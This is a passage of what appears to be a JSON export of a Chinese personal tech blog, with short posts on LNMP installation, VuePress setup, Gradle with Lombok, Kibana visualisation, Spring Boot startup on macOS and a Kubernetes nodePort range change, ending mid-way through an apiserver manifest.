服务器 lnmp 的使用","url":"/2019/03/2019-03-19-linux-lnmp/","content":"\nlnmp 官网 [https://lnmp.org/](https://lnmp.org/)\n\n安装文档 [https://lnmp.org/install.html](https://lnmp.org/install.html)\n\n<!-- more -->\n\n很简单按照教程安装\n\n```\nwget http://soft.vpser.net/lnmp/lnmp1.5.tar.gz -cO lnmp1.5.tar.gz && tar zxf lnmp1.5.tar.gz && cd lnmp1.5 && ./install.sh lnmp\n```\n\n添加一个站点：\n\n[https://lnmp.org/faq/lnmp-vhost-add-howto.html](https://lnmp.org/faq/lnmp-vhost-add-howto.html)\n\n\n```\nlnmp vhost add\n```\n\n> 注意：如果需要使用 https，则需要提前设置域名解析，最好等几分钟后在设置，这样 DNS 中才能查询得到。\n\nFAQ [https://lnmp.org/faq.html](https://lnmp.org/faq.html)\n\nNginx 默认是安装在 /usr/local/nginx/ 目录中的\n\nNginx 的默认配置文件在 `/usr/local/nginx/conf/nginx.conf` 中。这里的 http {} 中有一个 server {} ，这是默认的 server， 监听 80 端口，web 文件在 /home/wwwroot/default 中，server_name 为 _，意味着接收。\n\nhttp {} 中还有一行 include vhost/*.conf; 这意味着 /usr/local/nginx/conf/vhost/ 文件夹下的 .conf 文件都会被引入到这里。\n\n如果将 `/usr/local/nginx/conf/nginx.conf` 文件中的 server {} 删除，并且没有直接访问 IP 配置的 server，那么访问 IP 地址则会从 vhost 中选取第一个（笔者测试结果是这样）。\n\n详细的配置参考\n- [https://www.nginx.com/resources/wiki/start/topics/examples/full/](https://www.nginx.com/resources/wiki/start/topics/examples/full/)\n- [https://docs.nginx.com/nginx/admin-guide/web-server/web-server/](https://docs.nginx.com/nginx/admin-guide/web-server/web-server/)\n","categories":["Linux"],"tags":["Linux","linux","web","lnmp"]},{"title":"在 Ubuntu 上播放 mkv 格式的视频","url":"/2019/03/2019-03-19-ubuntu-mkv/","content":"\n执行下面命令即可。\n\n```\nsudo apt install ffmpeg\nsudo apt install mplayer\nsudo apt install smplayer\n```\n\n<!-- more -->\n\n之后将 mkv 文件的打开方式设置为 Smplayer 即可。\n\n倍速快捷键 \n\n[ 减速\n\n] 加速","categories":["ubuntu"],"tags":["ubuntu","mkv"]},{"title":"微服务架构核心20讲 - 学习笔记","url":"/2019/03/2019-03-21-geektime-micro-service-20/","content":"\nhttps://time.geekbang.org/course/detail/66-2184\n\n![29-18-10-micro-service_Page_01-jRJyzJ](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_01-jRJyzJ.png)\n\n<!-- more -->\n![29-18-10-micro-service_Page_02-B5KseE](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_02-B5KseE.png)\n![29-18-10-micro-service_Page_03-LJ7yKZ](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_03-LJ7yKZ.png)\n![29-18-10-micro-service_Page_04-6yUyPl](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_04-6yUyPl.png)\n![29-18-10-micro-service_Page_05-NnU4a9](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_05-NnU4a9.png)\n![29-18-10-micro-service_Page_06-lYH62m](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_06-lYH62m.png)\n![29-18-10-micro-service_Page_07-7st6OB](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_07-7st6OB.png)\n![29-18-10-micro-service_Page_08-EPOKJt](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_08-EPOKJt.png)\n![29-18-10-micro-service_Page_09-nUUnVL](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_09-nUUnVL.png)\n![29-18-10-micro-service_Page_10-DKqilF](https://up-img.yonghong.tech/pic/2021/07/29-18-10-micro-service_Page_10-DKqilF.png)\n![29-18-11-micro-service_Page_11-tAV6II](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_11-tAV6II.png)\n![29-18-11-micro-service_Page_12-ywlwsc](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_12-ywlwsc.png)\n![29-18-11-micro-service_Page_13-pYzUtT](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_13-pYzUtT.png)\n![29-18-11-micro-service_Page_14-2ddzk0](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_14-2ddzk0.png)\n![29-18-11-micro-service_Page_15-4k8xk2](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_15-4k8xk2.png)\n![29-18-11-micro-service_Page_16-9n1Iia](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_16-9n1Iia.png)\n![29-18-11-micro-service_Page_17-VxSivj](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_17-VxSivj.png)\n![29-18-11-micro-service_Page_18-aaRF9h](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_18-aaRF9h.png)\n![29-18-11-micro-service_Page_19-XQhYlX](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_19-XQhYlX.png)\n![29-18-11-micro-service_Page_20-AJ9Gzm](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_20-AJ9Gzm.png)\n![29-18-11-micro-service_Page_21-Vi8ffb](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_21-Vi8ffb.png)\n![29-18-11-micro-service_Page_22-VQepTO](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_22-VQepTO.png)\n![29-18-11-micro-service_Page_23-lXztTM](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_23-lXztTM.png)\n![29-18-11-micro-service_Page_24-p5Xi9u](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_24-p5Xi9u.png)\n![29-18-11-micro-service_Page_25-0XysqM](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_25-0XysqM.png)\n![29-18-11-micro-service_Page_26-Ivkkhl](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_26-Ivkkhl.png)\n![29-18-11-micro-service_Page_27-JhS6QB](https://up-img.yonghong.tech/pic/2021/07/29-18-11-micro-service_Page_27-JhS6QB.png)\n![29-18-12-micro-service_Page_28-EGsW83](https://up-img.yonghong.tech/pic/2021/07/29-18-12-micro-service_Page_28-EGsW83.png)\n![29-18-12-micro-service_Page_29-n5g1S3](https://up-img.yonghong.tech/pic/2021/07/29-18-12-micro-service_Page_29-n5g1S3.png)\n![29-18-12-micro-service_Page_30-SeyR1U](https://up-img.yonghong.tech/pic/2021/07/29-18-12-micro-service_Page_30-SeyR1U.png)\n![29-18-12-micro-service_Page_31-kvB0rp](https://up-img.yonghong.tech/pic/2021/07/29-18-12-micro-service_Page_31-kvB0rp.png)\n![29-18-12-micro-service_Page_32-rkeTV5](https://up-img.yonghong.tech/pic/2021/07/29-18-12-micro-service_Page_32-rkeTV5.png)\n![29-18-12-micro-service_Page_33-P48gzF](https://up-img.yonghong.tech/pic/2021/07/29-18-12-micro-service_Page_33-P48gzF.png)\n![29-18-12-micro-service_Page_34-NV2DWA](https://up-img.yonghong.tech/pic/2021/07/29-18-12-micro-service_Page_34-NV2DWA.png)\n![29-18-12-micro-service_Page_35-Vsl0D6](https://up-img.yonghong.tech/pic/2021/07/29-18-12-micro-service_Page_35-Vsl0D6.png)\n","categories":["微服务"],"tags":["微服务"]},{"title":"ERROR: No toolchains found in the NDK toolchains folder for ABI with prefix: mipsel-linux-android","url":"/2019/03/2019-03-22-no-ndk-toolchains-folder-for-abi-with-prefix-mipsel-linux-android/","content":"\n在 GitHub 上看到一个安卓的项目 [https://github.com/chentao0707/SimplifyReader](https://github.com/chentao0707/SimplifyReader)\n\n运行的时候报了个错 \n\n```\nERROR: No toolchains found in the NDK toolchains folder for ABI with prefix: mipsel-linux-android\n```\n\n<!-- more -->\n\n查了一下，是 NDK 更新了的原因，在 NDK r18 以后，mipsel-linux-android 被移除了，所以找不到这个包。\n\n看一下 Android Studio 中 Project Structure，找到 NDK 路径，打开文件夹查看，发现确实没有这个文件夹\n\n![29-18-13-ScreenShot2019-03-22at2.55.02PM-W4vvI8](https://up-img.yonghong.tech/pic/2021/07/29-18-13-Screen%20Shot%202019-03-22%20at%202.55.02%20PM-W4vvI8.png)\n\n\n去 [https://developer.android.com/ndk/downloads/](https://developer.android.com/ndk/downloads/) 下载老版本的 NDK，将老版本的 NDK toolchains 文件夹中 mipsel-linux-android 复制到你的 NDK 目录中。\n\n\n![29-18-13-ScreenShot2019-03-22at2.58.21PM-boe4M8](https://up-img.yonghong.tech/pic/2021/07/29-18-13-Screen%20Shot%202019-03-22%20at%202.58.21%20PM-boe4M8.png)\n","categories":["android"],"tags":["android"]},{"title":"解决Springboot在macOS上启动慢的问题","url":"/2019/07/2019-07-11-springboot-start-slow-on-macos/","content":"\nSpringboot在其他人电脑上启动只需要3s，但是在我的电脑上却需要30s，这可能是Springboot在macOS上JDK1.8的一个bug，只要在host添加了你的主机名就正常了\n\n<!-- more -->\n\n## 查看自己的主机名\n\n```sh\n➜  hostname\nwangyonghong.local\n```\n\n## 修改主机名\n\n系统偏好设置 -> 共享 -> 电脑名称\n\n## 添加host\n\n```sh\nsudo vim /etc/hosts\n\n127.0.0.1       localhost wangyonghong.local\n::1             localhost wangyonghong.local\n```\n\n改完之后，Springboot启动从30s变成了3s","categories":["springboot"],"tags":["macOS","springboot","启动慢","macos"]},{"title":"Vuepress踩坑小结","url":"/2019/07/2019-07-12-vuepress-start/","content":"\n## 介绍\n\nVuePress 由两部分组成：第一部分是一个[极简静态网站生成器](https://github.com/vuejs/vuepress/tree/master/packages/%40vuepress/core)，它包含由 Vue 驱动的主题系统和插件 API，另一个部分是为书写技术文档而优化的默认主题，它的诞生初衷是为了支持 Vue 及其子项目的文档需求。\n\n<!-- more -->\n\n每一个由 VuePress 生成的页面都带有预渲染好的 HTML，也因此具有非常好的加载性能和搜索引擎优化（SEO）。同时，一旦页面被加载，Vue 将接管这些静态内容，并将其转换成一个完整的单页应用（SPA），其他的页面则会只在用户浏览到的时候才按需加载。\n\n## 为什么不是...?\n\n### [Nuxt](https://nuxtjs.org/)\n\nVuePress 能做的事情，Nuxt 理论上确实能够胜任，但 Nuxt 是为构建应用程序而生的，而 VuePress 则专注在以内容为中心的静态网站上，同时提供了一些为技术文档定制的开箱即用的特性。\n\n### [Docsify](https://docsify.js.org/) / [Docute](https://docute.org/)\n\n这两个项目同样都是基于 Vue，然而它们都是完全的运行时驱动，因此对 SEO 不够友好。如果你并不关注 SEO，同时也不想安装大量依赖，它们仍然是非常好的选择！\n\n### [Hexo](https://hexo.io/)\n\nHexo 一直驱动着 Vue 的文档 —— 事实上，在把我们的主站从 Hexo 迁移到 VuePress 之前，我们可能还有很长的路要走。Hexo 最大的问题在于他的主题系统太过于静态以及过度地依赖纯字符串，而我们十分希望能够好好地利用 Vue 来处理我们的布局和交互，同时，Hexo 的 Markdown 渲染的配置也不是最灵活的。\n\n### [GitBook](https://www.gitbook.com/)\n\n我们的子项目文档一直都在使用 GitBook。GitBook 最大的问题在于当文件很多时，每次编辑后的重新加载时间长得令人无法忍受。它的默认主题导航结构也比较有限制性，并且，主题系统也不是 Vue 驱动的。GitBook 背后的团队如今也更专注于将其打造为一个商业产品而不是开源工具。\n\n## 更多介绍\n\n[https://vuepress.vuejs.org/](https://vuepress.vuejs.org/)\n\n[https://vuepress.vuejs.org/zh/](https://vuepress.vuejs.org/zh/)\n\n[https://vuepressbook.com/](https://vuepressbook.com/)\n\n## 开始\n\n### 环境\n\n本地运行文档需要安装 Node.js、Yarn。\n\nmacOS 安装 \n\n```sh\nbrew install node yarn\nyarn global add vuepress\n```\n\n### 运行\n\n运行的命令是在package.json中定义的\n\n```json\n{\n  \"scripts\": {\n    \"dev\": \"vuepress dev .\",\n    \"build\": \"vuepress build .\"\n  }\n}\n```\n\n执行\n\n```sh\nyarn dev\n```\n\n就等于执行\n\n```\nvuepress dev .\n```\n\n### 打包\n\n```sh\nyarn build\n```\n\n## 配置\n\n配置在.vuepress中config.js中，可参考[https://vuepress.vuejs.org/zh/config/](https://vuepress.vuejs.org/zh/config/)进行配置\n\n可以将导航配置单独拿出来\n\nconfig.js\n\n```js\nconst navConfig = require('./nav.js');\n\nmodule.exports = {\n  title: '产品文档',\n  description: 'lalalala',\n  head: [\n    ['link', { rel: 'icon', href: '/logo.png' }]\n  ],\n  dest: 'dist',\n  markdown: {\n    lineNumbers: false\n  },\n  themeConfig: {\n    nav: navConfig,\n    search: true,\n    searchMaxSuggestions: 10,\n    lastUpdated: 'Last Updated',\n    activeHeaderLinks: true,\n    displayAllHeaders: true,\n    sidebar: 'auto'\n  }\n}\n```\n\nnav.js\n\n```js\nmodule.exports = [\n    {\n      text: '首页', link: '/'\n    },\n    {\n      text: 'Android', \n      items: [\n        {\n          text: 'v1.0.0',\n          link: '/android/v1.0.0/'\n        }\n      ]\n    },\n    {\n      text: 'iOS', \n      items: [\n        {\n          text: 'v1.0.0',\n          link: '/ios/v1.0.0/'\n        }\n      ]\n    }\n  ]\n```\n\n## 部署\n\n### Nginx部署\n\n```conf\nserver {\n  listen 80;\n  server_name 127.0.0.1;\n\n  location / {\n    root /vuepress;\n    index index.html index.htm;\n    try_files $uri $uri/ /index.html;\n  }\n}\n; $uri 是请求文件的路径\n; $uri/ 事请求目录的路径\n; 二者缺一不可\n```\n\n## 亮点\n\n### 自定义容器\n\n```md\n::: tip\nThis is a tip\n:::\n\n::: warning\nThis is a warning\n:::\n\n::: danger\nThis is a dangerous warning\n:::\n```\n\n![29-18-18-屏幕快照2019-07-12上午9.43.41-gR4ink](https://up-img.yonghong.tech/pic/2021/07/29-18-18-%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-07-12%20%E4%B8%8A%E5%8D%889.43.41-gR4ink.png)","categories":["vuepress"],"tags":["vuepress","Vuepress","nginx","Nginx"]},{"title":"解决Gradle+Lombok报错","url":"/2019/07/2019-07-15-gradle-lombok/","content":"\n一般情况下，直接在dependencies里写如下配置就可以：\n\n```\ndependencies {\n    compileOnly 'org.projectlombok:lombok'\n    annotationProcessor 'org.projectlombok:lombok'\n}\n\n```\n\n<!-- more -->\n\n但是我在test中也用到了lombok，结果在运行 `./gradlew build` 的时候就报错了，说找不到 `build lombok.extern.slf4j`\n\n解决办法比较简单，也很清晰，只需要写上testCompileOnly和testAnnotationProcessor就可以了，如下：\n\n```\ndependencies {\n    compileOnly 'org.projectlombok:lombok'\n    annotationProcessor 'org.projectlombok:lombok'\n\n    testCompileOnly 'org.projectlombok:lombok'\n    testAnnotationProcessor 'org.projectlombok:lombok'\n}\n\n```","categories":["springboot"],"tags":["Gradle","springboot","gradle","lombok","Lombok","plugin"]},{"title":"Kibana画图从入门到放弃","url":"/2019/07/2019-07-21-kibana/","content":"\n## Elasticsearch简介\n\n网上介绍 Elasticsearch 的文档一堆，本文主要是以一个用过 MySQL 的开发者的角度来学习 Elasticsearch。\n\n<!-- more -->\n\n先推荐一下目前网上比较好的教程文档：\n\n - [Elasticsearch: 权威指南](https://es.0xl2oot.cn/)\n - [《死磕 Elasticsearch 方法论》：普通程序员高效精进的 10 大狠招！（完整版）](https://blog.csdn.net/laoyang360/article/details/79293493)\n\n### Elasticsearch与Lucene\n\nES=elaticsearch简写， Elasticsearch是一个开源的高扩展的分布式全文检索引擎，它可以近乎实时的存储、检索数据；本身扩展性很好，可以扩展到上百台服务器，处理PB级别的数据。 \n\nElasticsearch也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。\n\n1）Lucene只是一个库。想要使用它，你必须使用Java来作为开发语言并将其直接集成到你的应用中，更糟糕的是，Lucene非常复杂，你需要深入了解检索的相关知识来理解它是如何工作的。\n\n2）Elasticsearch也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。\n\n\n### Elasticsearch和关系型数据库的对比\n\n| 名称 | 概念 | 概念 | 概念 | 概念 |\n| -- | -- | -- | -- | -- |\n| Relational DB | Databases | Tables | Rows | Columns |\n| 关系型数据库 | 数据库 | 表 | 行 | 列 |\n| ElasticSearch | Indices | Types | Documents | Fields |\n| ElasticSearch | 索引 | 类型 | 文档 | 字段 |\n| 面向对象 | | | 对象 | 字段 |\n\n### ELK\n\nELK=elasticsearch+Logstash+kibana \n - elasticsearch：后台分布式存储以及全文检索 \n - logstash: 日志加工、“搬运工” \n - kibana：数据可视化展示。 \n\nELK架构为数据分布式存储、可视化查询和日志解析创建了一个功能强大的管理链。 三者相互配合，取长补短，共同完成分布式大数据处理工作。\n\n\n## 初识Kibana\n\nelastic官网是提供了Kibana的用户手册的，还有中文版本\n\n - [Kibana用户手册](https://www.elastic.co/guide/cn/kibana/current/index.html)\n - [6.0 版本中的重要更新](https://www.elastic.co/guide/cn/kibana/current/breaking-changes-6.0.html)\n\n > 说明： Kibana 5.x 允许用户使用 Elasticsearch 支持的任何脚本语言创建脚本化的字段。而 Kibana 6.0 将只支持基于 Painless 和 Lucene 表达式的脚本。\n\n![29-18-20-屏幕快照2019-07-23上午10.02.47-fVJZzx](https://up-img.yonghong.tech/pic/2021/07/29-18-20-%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-07-23%20%E4%B8%8A%E5%8D%8810.02.47-fVJZzx.png)\n\n### 数据探索（Discover）\n\n[数据探索](https://www.elastic.co/guide/cn/kibana/current/discover.html)\n\n您可以在数据探索（Discover）页面交互式地探索您的数据。您可以访问与选定索引模式匹配的每个索引中的每个文档。您可以提交搜索请求、过滤搜索结果、查看文档数据。您还可以看到与搜索查询匹配的文档数，并获取字段值的统计信息。如果索引模式中配置了时间字段，您还可以在这个页面的顶部看到基于时间分布的文档数量柱状图。\n\n![29-18-20-Discover-Start-Annotated-scNWFn](https://up-img.yonghong.tech/pic/2021/07/29-18-20-Discover-Start-Annotated-scNWFn.png)\n\n### 可视化 (Visualize) \n\n可视化 (Visualize) 功能可以为您的 Elasticsearch 数据创建可视化控件。然后，您就可以创建仪表板将这些可视化控件整合到一起展示。\n\nKibana 可视化控件基于 Elasticsearch 的查询。利用一系列的 Elasticsearch 查询聚合功能来提取和处理数据，您可以通过创建图表来呈现您关心的数据分布和趋势。\n\n您可以基于在 Discover 页面保存的查询或者新建一个查询来创建可视化控件。\n\n要创建可视化视图：\n\n1. 点击左侧导航栏的 **Visualize** 。\n\n2. 点击 **Create new visualization** 按钮或 **+** 按钮。\n\n3. 选择视图类型：\n\n   - **基础图形**\n     - [Line, Area and Bar charts](https://www.elastic.co/guide/cn/kibana/current/xy-chart.html)  在X/Y图中比较两个不同的序列。\n     - [Heat maps](https://www.elastic.co/guide/cn/kibana/current/heatmap-chart.html)  使用矩阵的渐变单元格。\n     - [Pie chart](https://www.elastic.co/guide/cn/kibana/current/pie-chart.html)  显示每个来源的占比。\n\n   - **数据**\n     - [Data table](https://www.elastic.co/guide/cn/kibana/current/data-table.html)  显示一个组合聚合的原始数据。\n     - [Metric](https://www.elastic.co/guide/cn/kibana/current/metric-chart.html)  显示单个数字。\n\n   - **地图**\n     - [Coordinate map](https://www.elastic.co/guide/cn/kibana/current/tilemap.html)  把一个聚合结果关联到地理位置。\n\n   - **时间序列**\n     - [Timelion](https://www.elastic.co/guide/cn/kibana/current/timelion-getting-started.html)  计算和合并来自多个时间序列数据集。\n     - [Time Series Visual Builder](https://www.elastic.co/guide/cn/kibana/current/time-series-visual-builder.html)  使用管道聚合显示时间序列数据。\n\n   - **其他**\n     - [Tag cloud](https://www.elastic.co/guide/cn/kibana/current/tagcloud-chart.html)  显示标签云，每个标签的字体大小表示其重要性。\n     - [Markdown widget](https://www.elastic.co/guide/cn/kibana/current/markdown-widget.html)  显示自由格式信息或说明。\n\n4. 指定一个查询，为视图获取数据：\n\n   - 想要输入新的搜索条件，只需为包含想要可视化数据的索引库选择索引模式。这将打开一个可视化视图编辑器，并关联一个匹配所选索引库里所有文档的通配符查询。\n\n   - 想要从一个已有的搜索来构建一个可视化视图，只需点击想使用的已有查询名称即可。这将打开一个视图编辑器并加载所选的查询。\n\n     > 当从一个已有的搜索来构建可视化视图时，随后对已有查询的任何修改都会自动反馈在视图中。想要禁止自动更新，您需要断开视图和已保存的搜索之间的连接。\n\n5. 在视图编辑器中为视图的Y轴选择指标聚合：\n\n   - **指标聚合(Metrics Aggregations)** ：\n    - [count](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-valuecount-aggregation.html)\n    - [average](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-avg-aggregation.html)\n    - [sum](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-sum-aggregation.html)\n    - [min](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-min-aggregation.html)\n    - [max](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-max-aggregation.html)\n    - [standard deviation](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-stats-aggregation.html)\n    - [unique count](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-cardinality-aggregation.html)\n    - [median](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-percentile-aggregation.html) (50th percentile)\n    - [percentiles](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-percentile-aggregation.html)\n    - [percentile ranks](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-percentile-rank-aggregation.html)\n    - [top hit](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-top-hits-aggregation.html)\n    - [geo centroid](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-metrics-geocentroid-aggregation.html)\n   - **父类管道聚合(Parent Pipeline Aggregations)** ：\n    - [derivative](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-pipeline-derivative-aggregation.html)\n    - [cumulative sum](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-pipeline-cumulative-sum-aggregation.html)\n    - [moving average](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-pipeline-movavg-aggregation.html)\n    - [serial diff](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-pipeline-serialdiff-aggregation.html)\n   - **兄弟管道聚合(Sibling Pipeline Aggregations)** ：\n    - [average bucket](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-pipeline-avg-bucket-aggregation.html)\n    - [sum bucket](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-pipeline-sum-bucket-aggregation.html)\n    - [min bucket](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-pipeline-min-bucket-aggregation.html)\n    - [max bucket](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-pipeline-max-bucket-aggregation.html)\n\n6. 为视图X轴选择一个桶聚合：\n\n   - [date histogram](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-bucket-datehistogram-aggregation.html)\n   - [range](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-bucket-range-aggregation.html)\n   - [terms](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-bucket-terms-aggregation.html)\n   - [filters](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-bucket-filters-aggregation.html)\n   - [significant terms](https://www.elastic.co/guide/en/elasticsearch/reference/6.0/search-aggregations-bucket-significantterms-aggregation.html)\n\n比如，如果正在索引 Apache 服务器日志，就可以构建一个条形图，通过指定 `geo.src` 字段上的一个 term 聚合，来展示地理位置的请求分布：\n\n![29-18-20-bar-terms-agg-qzgkr3](https://up-img.yonghong.tech/pic/2021/07/29-18-20-bar-terms-agg-qzgkr3.jpg)\n\nY轴表示来自每个国家的请求数量，而X轴则表示要显示的国家。\n\n图、线或区域图的可视化都是使用 *度量* 指标作为Y轴，使用 *桶* 作为X轴。桶类似于SQL中的 `GROUP BY`语句。Pie 图中使用分片大小作为指标，分片数量作为桶。\n\n还可以进一步根据指定的子聚合来划分数据。第一个聚合决定任何子序列聚合的数据集。子聚合是有顺序的，可以通过拖拽聚合来改变。\n\n比如，可以在 `geo.dest` 字段增加一个 term 子聚合到原始国家条形图，来查看这些请求对应的位置。\n\n![29-18-20-bar-terms-subagg-UaduZb](https://up-img.yonghong.tech/pic/2021/07/29-18-20-bar-terms-subagg-UaduZb.jpg)\n\n更多关于子聚合的内容，请参考这篇博文 [Kibana, Aggregation Execution Order, and You](https://www.elastic.co/blog/kibana-aggregation-execution-order-and-you)。\n\n### 仪表板（Dashboard）\n\nKibana 仪表板（Dashboard） 展示保存的可视化结果集合。\n\n仪表板示例. \n\n![29-18-21-tutorial-dashboard-tnSCaX](https://up-img.yonghong.tech/pic/2021/07/29-18-21-tutorial-dashboard-tnSCaX.png)\n\n在编辑模式下，您可以根据需要安排和调整可视化结果集，并保存仪表板，以便重新加载和共享。\n\n编辑模式. \n\n![29-18-21-Dashboard-Tutorial-Edit-Mode-JyXjwr](https://up-img.yonghong.tech/pic/2021/07/29-18-21-Dashboard-Tutorial-Edit-Mode-JyXjwr.png)\n\n### 时序控件（Timelion）\n\n时序控件（Timelion）是一款时间序列数据可视化工具，它可以将多种独立的数据源合并呈现到一张视图上。它是由一个简单的表达式语言驱动的，用来检索时间序列数据，执行计算得出复杂问题的答案，并可视化结果。\n\n例如，Timelion 可以让您轻松获得如下问题的答案：\n\n- 过去某段时间页面的 UV 量是多少？\n- 本周五和上周五的流量有多少差异？\n- 本站今天来自日本的访客占多少百分比？\n- 标普500指数过去10天的移动平均值是多少？\n- 过去两年所有的搜索请求总量有多少？  \n\n您还可能对以下视频教程感兴趣：\n\n- [Timelion: 魔法、数学，一切尽在其中](https://www.elastic.co/elasticon/conf/2017/sf/timelion-magic-math-and-everything-in-the-middle)\n- [Timelion 插件为 Kibana 提供了时间序列分析工具](https://www.elastic.co/videos/timelion-plugin-for-kibana-enables-times-series-paris-meetup)\n- [利用 Kibana 和 Timelion 分析地震数据](https://www.elastic.co/videos/using-kibana-and-timelion-to-analyze-earthquake-data)\n\n## 用Kibana画图\n\n - [线形图，区域图和条形图](https://www.elastic.co/guide/cn/kibana/current/xy-chart.html)\n - [数据表](https://www.elastic.co/guide/cn/kibana/current/data-table.html)\n - [指标（Metric）](https://www.elastic.co/guide/cn/kibana/current/metric-chart.html)\n - [饼图](https://www.elastic.co/guide/cn/kibana/current/pie-chart.html)\n - ……\n","categories":["kibana"],"tags":["kibana","elasticsearch","es","画图","chart"]},{"title":"Kubernetes 调整 nodePort 端口范围","url":"/2020/05/kubernetes-ports/","content":"\n### 问题\n\n默认情况下，k8s 集群 nodePort 分配的端口范围为：30000-32767，如果我们指定的端口不在这个范围就会报类似下面这样的错误：\n> Error: release kong failed: Service “kong-kong-admin” is invalid: spec.ports[0].nodePort: Invalid value: 8444: provided port is not in the valid range. The range of valid ports is 30000-32767\n\n<!--more-->\n\n### 解决\n\n解决方法就是调整 kube-apiserver 组件启动参数，指定 nodePort 范围。如果是用 kubeadm 安装的集群，那么 apiserver 是以静态 pod 的形式运行，pod 文件定义在 /etc/kubernetes/manifests/kube-apiserver.yaml。/etc/kubernetes/manifests 目录下是所有静态 pod 文件的定义，kubelet 会监控该目录下文件的变动，只要发生变化，pod 就会重建，响应相应的改动。所以我们修改 /etc/kubernetes/manifests/kube-apiserver.yaml 文件，添加 nodePort 范围参数后会自动生效，无需进行其他操作：<br />vim /etc/kubernetes/manifests/kube-apiserver.yaml<br />在 command 下添加 `--service-node-port-range=1-65535` 参数，修改后会自动生效，无需其他操作:<br />\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n    - kube-apiserver\n    - --service-node-port-range=1-65535\n    - --advertise-address=192.168.26.10\n    - --allow-privileged=true\n    - --authorization-mode=Node,RBAC\n    - --client-ca-file=/etc/kubernetes/pki/ca.crt\n    - --enable-admission-plugins=NodeRestriction\n    - --enable-bootstrap-token-auth=true\n    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt\n    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt\n    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key\n    - --etcd-servers=https://127.0.0.1:2379\n    - --insecure-port=0\n    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt\n    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key\n    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname\n    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt\n    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key\n    - --requestheader-allowed-names=front-proxy-client\n    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt\n    - --requestheader-extra-headers-prefix=X-Remote-Extra-\n    - --requestheader-group-headers=X-Remote-Group\n    - --requestheader-username-headers=X-Remote-User\n    - --secure-port=6443\n    - --service-account-key-file=/etc/kubernetes/pki/sa.pub\n    - --service-cluster-ip-range=10.96.0.0/12\n    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt\n    - 